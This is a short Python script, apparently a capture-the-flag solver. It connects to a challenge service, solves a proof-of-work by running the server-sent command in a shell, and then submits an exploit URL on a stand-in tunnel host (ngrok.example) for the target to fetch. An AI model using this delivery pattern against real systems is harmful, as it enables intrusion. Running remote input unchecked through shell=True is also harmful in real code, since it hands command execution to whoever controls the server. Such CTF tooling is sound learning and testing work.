#!/usr/bin/env python3

import sys
import socket
import subprocess


IP = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31338

EXPLOIT_URL = (
    sys.argv[3]
    if len(sys.argv) > 3
    else 'http://ngrok.example:12345/exploit'
)


def solve_pow(pow: str) -> str:
    process = subprocess.Popen(pow, shell = True, stdout = subprocess.PIPE)
    stdout, _ = process.communicate()

    return stdout.strip().decode()


def main() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(3)
        sock.connect((IP, PORT))
        file = sock.makefile('rwb')

        file.readline()
        pow = file.readline().strip().decode()
        print(f'pow: {pow}')
        solution = solve_pow(pow)
        print(f'solution: {solution}')
        file.write(solution.encode() + b'\n')
        file.flush()
        assert b'Correct' in file.readline()

        file.readline()
        file.write(EXPLOIT_URL.encode() + b'\n')
        file.flush()
        assert b'OK' in file.readline()


if __name__ == '__main__':
    main()
